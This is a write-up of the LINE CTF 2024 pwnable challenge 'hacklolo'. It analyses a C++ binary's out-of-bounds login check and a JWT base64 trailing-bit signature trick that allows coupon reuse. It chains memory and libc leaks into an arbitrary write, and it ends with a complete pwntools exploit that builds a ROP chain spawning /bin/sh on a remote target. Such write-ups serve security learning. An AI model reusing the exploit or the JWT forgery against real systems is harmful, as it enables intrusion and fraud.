+++
title = "LINE CTF 2024 - hacklolo"
date = "2024-10-18"
description = "LINE CTF 2024 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "out of bound", "jwt counterfeit", "ansi escape code"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/hacklolo'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

A binary made in C++ that was quite challenging to analyze.

### Structure
``` c
struct user_db // sizeof=0xD68
{
    struct user user_list[32];
    user *user_list_ptr;
    _QWORD count;
    _QWORD login_try;
    _QWORD is_login;
    char *welcome_ptr;
    _QWORD welcome_size;
    char welcome[8];
    _QWORD canary;
    user *current_user;
    _QWORD login_success;
    char *jwt_key;
    _QWORD jwt_key_size;
    _QWORD jwt_key_end;
};
struct user // sizeof=0x68
{
    char *pw_ptr;
    _QWORD pw_size;
    char pw[8];         // or could be nothing
    _QWORD end_pw;
    char *id_ptr;
    _QWORD id_size;
    char id[8];         // or could be nothing
    _QWORD end_id;
    char *email_ptr;
    _QWORD email_size;
    char email[8];      // or could be nothing
    _QWORD end_email;
    _QWORD age;
};
```

Perhaps due to the properties of `basic_string` objects in C++, strings aren't stored directly. Taking `id` as an example:

- `id_ptr` : address where the string is stored
- `id_size` : length of the string
- `id[8]` : strings up to length `8` are stored here; longer strings are allocated elsewhere
- `id_end` : unused area, presumably chunk-related data


## 0x01. Vulnerability
### Out of bound
``` c
__int64 __fastcall login_790E(user_db *user_db)
{
  ...
  for ( i = 0; i <= 32; ++i )
  {
    a2_20_23596(id, &user_db->user_list[i]);
    id_same = strncmp_1043E(id, id_input);
    std::string::~string(id);
    if ( id_same )
    {
      a2_0_235C8(pw, &user_db->user_list[i]);
      pw_same = strncmp_1043E(pw, pw_input);
      std::string::~string(pw);
      if ( pw_same )
      {
        user_db->current_user = &user_db->user_list[i];
        a2_20_23596(v15, &user_db->user_list[i]);
        sub_F7F3(id, "[*] Login Success. Hello, ", v15);
        ...
      }
    }
  }
  ...
}
```

While `used_db` has space to store `32` `user` entries, `login_790E()` checks a range of `33` entries.

As a result, the area after `user_list[32]` is recognized as another `user`, causing overlapping regions.

|after `user_list`|`user`|
|:-:|:-:|
|user *user_list_ptr  |char *pw_ptr|
|_QWORD count         |_QWORD pw_size|
|_QWORD login_try     |char pw[8]|
|_QWORD is_login      |_QWORD end_pw|
|char *welcome_ptr    |char *id_ptr|
|_QWORD welcome_size  |_QWORD id_size|
|char welcome[8]      |char id[8]|
|_QWORD canary        |_QWORD end_id|
|user *current_user   |char *email_ptr|
|_QWORD login_success |_QWORD email_size|
|char *jwt_key        |char email[8]|
|_QWORD jwt_key_size  |_QWORD end_email|
|_QWORD jwt_key_end|  | - |

Therefore, we can log in with an account whose `id` is `"Welcome!"`, which is output when the binary runs.

### JWT counterfeit
The `coupon` generated during `join` is a JWT value created with HS256, where the signature part is generated using HMAC-SHA256.

The output is 256 bits (32 bytes), which is base64URL encoded.

Since base64 encodes in 3-byte units, padding (`=`) is added during encoding.

![base64.png](https://ctf-wiki.mahaloz.re/misc/encode/figure/base64_0.png)

However, not only `=` but also **the last two bits of the last byte** are padded with `00`.

Therefore, during decoding, **the last two bits of the last byte** don't affect the original data.

In other words, any of `00`, `01`, `10`, `11` in **the last two bits of the last byte** decodes to the same value.

If the decoded value is the same, incrementing the `coupon` value bit by bit still passes signature verification, making it possible to register the coupon multiple times.

This is an implementation issue with JWS. I'm not sure how to exploit it further, but it seems applicable elsewhere.


## 0x02. Exploit
### Memory leak
The memory in the area after `user_db->user_list[32]` (`Welcome!` account) looks like this.

``` bash
# Welcome!
gef➤  x/13gx $rbp-0xa0
0x7fffffffec60: 0x00007fffffffdf60      0x0000000000000001
0x7fffffffec70: 0x0000000000000000      0x0000000000000000
0x7fffffffec80: 0x00007fffffffec90      0x0000000000000008
0x7fffffffec90: 0x21656d6f636c6557      0xc8647733c17b4d00
0x7fffffffeca0: 0x00007ffff77d7ce0      0x0000000000000000
0x7fffffffecb0: 0x00005555555a5f80      0x0000000000000020
0x7fffffffecc0: 0x000000000000003c
```

The area representing `pw_ptr` contains `0x7fffffffdf60`, the starting address of `user_list`, and the area representing `pw_size` contains `count`, which represents the number of accounts.

Currently, `count` is `1` after adding the `admin` account in `setup_admin_7D3A()` called early in `main()`.

Therefore, the `Welcome!` account's password is the `1` byte stored at `0x7fffffffdf60`.

Using this, we can brute force `1` byte at a time while increasing users to achieve memory leak.

``` bash
# admin
gef➤  x/13gx $rbp-0xda0
0x7fffffffdf60: 0x00007fffffffdf70      0x0000000000000008
0x7fffffffdf70: 0x6e374f7175585a68      0x0000000000000300
0x7fffffffdf80: 0x00007fffffffdf90      0x0000000000000005
0x7fffffffdf90: 0x0000006e696d6461      0x00000000001e3e30
0x7fffffffdfa0: 0x00005555555a5ed0      0x0000000000000012
0x7fffffffdfb0: 0x000000000000001e      0x000000000000001c
0x7fffffffdfc0: 0x0000000000000022
```

`0x7fffffffdf60` is actually `user_list[0]`, storing information for the first account `admin`.

Since `count` can increase up to `32`, we can leak up to `32` bytes. However, since the last `8` bytes are other `basic_string` data, I only attempted to leak `26` bytes total.

Through this, we can obtain the stack address and `admin`'s `pw`.

``` python
def memory_leak(s):
    hit = bytes()
    for i in range(0x1a):
        for j in range(0x100):
            if j in [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]:
                continue
            r = login(s, b"Welcome!", hit + j.to_bytes(1, 'little'))
            if b"Login Success" in r:
                hit += j.to_bytes(1, 'little')
                sys.stdout.write(f"\rhit : {hit}")
                sys.stdout.flush()
                break
        logout(s)
        it = str(i + 1).encode()
        join(s, it, it, it, i + 1)
    sys.stdout.write(f"\n")
    return hit
```

Values representing `\t`, `\n`, etc. cannot be leaked through input/output, but this doesn't seem to be a frequent problem.

### Game win
After logging in, you can choose one of: `Play Game`, `Apply Coupon`, `Coupon usage history`, `Change PW`, `Print Information`.

Among these, `Change PW` and `Print Information` are menus that require defeating the boss in `Play Game` to become a `regular member`.

When solving the problem, I first beat the game to move to the next step, but I should develop the habit of planning the exploit scenario first with a clear objective.

Using the OOB vulnerability, beating the game with the `Welcome!` account and calling `Change PW` allows changing the value at the location `pw_ptr` points to.

Since `Welcome!->pw_ptr` points to the address storing `admin->pw_ptr`, we can change `admin->pw_ptr` to the desired address, then log in as `admin` and call `Change PW` again to write data to the previously set desired address, achieving AAW.

However, it's not complete AAW because the moment we change `admin->pw_ptr`, the password needed to log in as `admin` changes.

Therefore, we need to know the value stored at the address where we'll write data. Looking back now, it might have been okay to also change `admin->pw_size` to `1` when changing `Welcome!`'s password and do brute forcing.

Anyway, in the game, you must avoid the `Enemy` following you, obtain `Item`s to increase `Attack` and `Defense`, then fight the `Enemy`. Even after collecting all items, you can't beat the `Enemy`.

Using the `coupon` issued during registration doubles your `Attack`, so using the JWT counterfeit vulnerability to apply four `coupon`s total lets you beat the `Enemy`.

The problem is that to get the AAW mentioned above, the `Welcome!` account needs to become a `regular member`, but since the `Welcome!` account isn't a registered account, there's no issued `coupon`.

``` c
__int64 __fastcall join_8A4A(user_db *user_db)
{
  ...
  if ( user_db->count <= 31 )
  {
    ...
      for ( i = 0; i < user_db->count; ++i )
      {
        a2_20_23596(id_i, &user_db->user_list[i]);
        id_same = strncmp_1043E(id_i, id);
        std::string::~string(id_i);
        if ( id_same )
        {
          std::operator<<<std::char_traits<char>>(&std::cout, "[*] The ID already exists.\r");
          std::ostream::operator<<();
          result = -1;
          goto LABEL_13;
        }
      }
    ...
  }
}
```

Fortunately, looking at `join_8A4A()`, it only checks for duplicate `id` by looping through `user_list` up to `count`, so we can create a `Welcome!` account.

Also, in `login_790E()`, if only the `id` matches and `pw` doesn't, it just moves to the next loop, so we can still log in to the 33rd `Welcome!` account after registration.

The last question is whether the created `Welcome!` account's `coupon` can be used by the 33rd `Welcome!` account. After checking the `secret key` in the debugger and examining the content on jwt.io, they have the same `userid`, so the 33rd `Welcome!` account could use the `coupon`.

![jwt info](https://github.com/user-attachments/assets/16e803e0-4ba8-4732-b7b5-3ef162ca3895)

So I wrote the payload as follows.

``` python
    # join fake "Welcome!"
    r = join(s, b"Welcome!", b"Welcome@", b"Welcome#", 0x10)
    coupon = r.split(b"issued : ")[1].split(b"\r\n")[0]
    log.info(f"coupon : {coupon}")
    login(s, b"Welcome!", ml + b"\x00\x00")

    # counterfeit coupon
    if not apply_coupon_quadra(s, coupon):
        log.failure(f"bad coupon :(")
        exit()
```

Now I needed to beat the game, and while I wanted to automate it for future debugging... the input/output using ANSI escape codes took forever.

Ultimately, I used a library called `pyte` to parse map information. For the `Item` collection algorithm, I couldn't think of anything good, so I used this simple approach:

1. Move up to one square away from `Enemy` to increase probability
2. Move to bottom left - `(0, 0)`
3. Move to top left - `(0, 16)`
4. Move to column with `Item` - `(n, 16)`
5. Move to bottom - `(n, 0)`
6. If all items collected, go to 7; if remaining, go to 2
7. Fight `Enemy`

For some reason, going to `(0, 16)` often creates a two-square gap with `Enemy`, so I added code to just restart the game if the `Item`'s column is too close, as that was faster.

### Libc leak
Even with AAW through the method described above, where to control RIP remains a problem.

Therefore, I determined libc leak was necessary and found `Print Information` when checking output sections.

It outputs `email`, where `email_size` overlaps with the `Welcome!->login_success` area.

So I determined memory leak would be possible by logging in successfully to increase the `login_success` value.

Note that, perhaps because it's C++, many libraries are used, so you need to carefully find and retrieve the glibc region.

``` python
    logout(s)
    for _ in range(0xa0):
        login(s, b"Welcome!", b"Welcome@")
        logout(s)
    login(s, b"Welcome!", ml + b"\x00\x00")
    r = print_info(s)
    libc = u64(r[0xcc:0xd4])
    lib.address = libc - 0x29d90
    log.info(f"libc : {hex(lib.address)}")
```

### RIP control
Now knowing the stack address, I wrote a payload to overwrite `main()`'s return address to execute ROP gadgets then run `execve`.

However, since `free_db_24FBA()` called just before `main()` ends frees objects storing each `user` information, we need to restore `admin->pw_ptr` that was changed for AAW.

``` c
__int64 __fastcall free_db_24FBA(__int64 user_db)
{
  ...
  if ( user_db )
  {
    for ( i = user_db + 0xD00; ; free_strings_F406(i) )
    {
      result = user_db;
      if ( i == user_db )
        break;
      i -= 0x68LL;
    }
  }
  return result;
}
```

So I wrote the payload as follows.

``` python
    # change admin->pw to point return address of main
    ret = stack + 0xd98
    change_pw(s, p64(ret) + p64(0x8))
    
    # overwrite return address
    logout(s)
    pop_rdi_ret = lib.address + 0x2a3e5
    pop_rsi_ret = lib.address + 0x2be51
    pop_rdx_rbx_ret = lib.address + 0x904a9
    payload = p64(pop_rdi_ret)
    payload += p64(next(lib.search(b"/bin/sh")))
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(pop_rdx_rbx_ret)
    payload += p64(0)
    payload += p64(0)
    payload += p64(lib.symbols["execve"])
    login(s, b"admin", p64(libc))
    change_pw(s, payload)

    # restore admin->pw
    logout(s)
    login(s, b"Welcome!", p64(ret) + p64(len(payload)))
    change_pw(s, p64(stack) + p64(0x8))
```


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser
import sys
import pyte

BINARY = "game"
LIBRARY = "libc.so.6"
CONTAINER = "7e8bfb970414"

def join(s, id, pw, email, age):
    s.sendline(b"1")
    s.sendlineafter(b"Id:\r\n", id)
    s.sendlineafter(b"Pw:\r\n", pw)
    s.sendlineafter(b"Email:\r\n", email)
    s.sendlineafter(b"Age:\r\n", str(age).encode())
    return s.recvuntil(b"Choice : \r\n")

def login(s, id, pw):
    s.sendline(b"2")
    s.sendlineafter(b"id:\r\n", id)
    s.sendlineafter(b"pw:\r\n", pw)
    return s.recvuntil(b"Choice : \r\n")

def quit_(s):
    s.sendline(b"3")
    return s.recvuntil(b"quit\r\n")

def logout(s):
    return s.sendlinethen(b"Choice : \r\n", b"1")

def play_game(s):
    s.sendline(b"2")

def apply_coupon(s, coupon):
    s.sendline(b"3")
    s.sendlineafter(b"coupon : \r\n", coupon)
    r = s.recvuntil(b"Choice : \r\n")
    if r.find(b"successfully") > -1:
        log.success(f"coupon use success")
        return True
    else:
        log.failure(f"something wrong with {coupon}")
        return False

def usage_history(s):
    s.sendline(b"4")
    return s.recvuntil(b"Choice : \r\n")

def change_pw(s, pw):
    s.sendline(b"5")
    s.sendlineafter(b"PW? : \r\n", b"y")
    s.sendlineafter(b"PW : \r\n", pw)
    return s.recvuntil(b"Choice : \r\n")

def print_info(s):
    s.sendline(b"6")
    return s.recvuntil(b"Choice : \r\n")

def memory_leak(s):
    hit = bytes()
    for i in range(0x1a):
        for j in range(0x100):
            if j in [0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20]:
                continue
            r = login(s, b"Welcome!", hit + j.to_bytes(1, 'little'))
            if b"Login Success" in r:
                hit += j.to_bytes(1, 'little')
                sys.stdout.write(f"\rhit : {hit}")
                sys.stdout.flush()
                break
        logout(s)
        it = str(i + 1).encode()
        join(s, it, it, it, i + 1)
    sys.stdout.write(f"\n")
    return hit

def apply_coupon_quadra(s, coupon):
    apply_coupon(s, coupon)
    coupon_dup = coupon[:-1] + chr(coupon[-1] + 1).encode()
    apply_coupon(s, coupon_dup)
    coupon_dup = coupon_dup[:-1] + chr(coupon_dup[-1] + 1).encode()
    apply_coupon(s, coupon_dup)
    coupon_dup = coupon_dup[:-1] + chr(coupon_dup[-1] + 1).encode()
    r = apply_coupon(s, coupon_dup)
    return r

def parse_map(data, p=0):
    # 터미널 크기 설정 (24행, 80열 등으로 설정)
    screen = pyte.Screen(80, 24)
    stream = pyte.Stream(screen)

    stream.feed(data.decode('utf-8'))

    # 화면 출력 파싱 후 'I', 'O', 'E' 위치 찾기
    positions = {'I': [], 'O': [], 'E': []}
    for row_num, row in enumerate(screen.display, start=1):
        if row_num < 4:
            continue
        for col_num, char in enumerate(row, start=1):
            if char in positions:
                positions[char].append((row_num, col_num))
    
    if p == 1:
        for line in screen.display:
            print(line)
        print(positions)
    return positions

def move(s, direction):
    for d in direction:
        s.send(d.encode())
        s.recvuntil(b"||")
        try:
            r = s.recvuntil(b"||", timeout=3)
        except TimeoutError:
            log.failure(f"game lost :(")
            exit()
    return r

def win_game(s):
    while 1:
        s.sendline(b"2")
        r = s.recvuntil(b"||")
        positions = parse_map(r)
        item_col = sorted(set([item[1] for item in positions['I']]))
        log.info(f"items located in col {item_col}")

        # die if too close
        die = 0
        if item_col[0] < 10:
            log.info("I would rather kill myself...")
            die = 1
            while r := move(s, 'f'):
                if b"Game Over!" in r:
                    s.send(b"\n")
                    break
        if die:
            continue
        
        # go to 0, 0
        direction = 'w' * 6
        direction += 's' * 8
        direction += 'a' * 30
        r = move(s, direction)
        parse_map(r)

        # farm items
        for c in item_col:
            log.info(f"farming item in col {c}")
            direction = 'w' * 16
            direction += 'd' * (c - 2)
            direction += 's' * 16
            direction += 'a' * (c - 2)
            r = move(s, direction)
            parse_map(r)
            
        # fight!
        while r := move(s, 'f'):
            if b"Game Over!" in r:
                s.send(b"\n")
                return s.recvuntil(b" : \r\n")

code_base = 0x555555554000
bp = {
    'login_switch_main' : code_base + 0x24145,
    'join' : code_base + 0x8A4A,
    'free_join' : code_base + 0x8F44,
    'login' : code_base + 0x23FFE,
    'after_login' : code_base + 0x240D2,
    'ret_main' : code_base + 0x24A1D,
}

gs = f'''
b *{bp["ret_main"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    s.recvuntil(b"Choice : \r\n").decode()
    
    # memory leak using OOB
    ml = memory_leak(s)
    stack = u64(ml[0:8])
    admin_pw = ml[0x10:0x18]
    log.info(f"stack : {hex(stack)}")
    log.info(f"admin pw : {admin_pw.decode()}")

    # join fake "Welcome!"
    r = join(s, b"Welcome!", b"Welcome@", b"Welcome#", 0x10)
    coupon = r.split(b"issued : ")[1].split(b"\r\n")[0]
    log.info(f"coupon : {coupon}")
    login(s, b"Welcome!", ml + b"\x00\x00")

    # counterfeit coupon
    if not apply_coupon_quadra(s, coupon):
        log.failure(f"bad coupon :(")
        exit()

    # win game to be regular member
    if b"regular member" not in win_game(s):
        log.failure(f"game lost :(")
        exit()
    log.success(f"game win!")
    s.sendlinethen(b"Choice : \r\n", b'y')

    # libc leak by increasing login_success(email_size)
    logout(s)
    for _ in range(0xa0):
        login(s, b"Welcome!", b"Welcome@")
        logout(s)
    login(s, b"Welcome!", ml + b"\x00\x00")
    r = print_info(s)
    libc = u64(r[0xcc:0xd4])
    lib.address = libc - 0x29d90
    log.info(f"libc : {hex(lib.address)}")

    # change admin->pw to point return address of main
    ret = stack + 0xd98
    change_pw(s, p64(ret) + p64(0x8))
    
    # overwrite return address
    logout(s)
    pop_rdi_ret = lib.address + 0x2a3e5
    pop_rsi_ret = lib.address + 0x2be51
    pop_rdx_rbx_ret = lib.address + 0x904a9
    payload = p64(pop_rdi_ret)
    payload += p64(next(lib.search(b"/bin/sh")))
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(pop_rdx_rbx_ret)
    payload += p64(0)
    payload += p64(0)
    payload += p64(lib.symbols["execve"])
    login(s, b"admin", p64(libc))
    change_pw(s, payload)

    # restore admin->pw
    logout(s)
    login(s, b"Welcome!", p64(ret) + p64(len(payload)))
    change_pw(s, p64(stack) + p64(0x8))

    # trigger ret in main
    logout(s)
    quit_(s)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```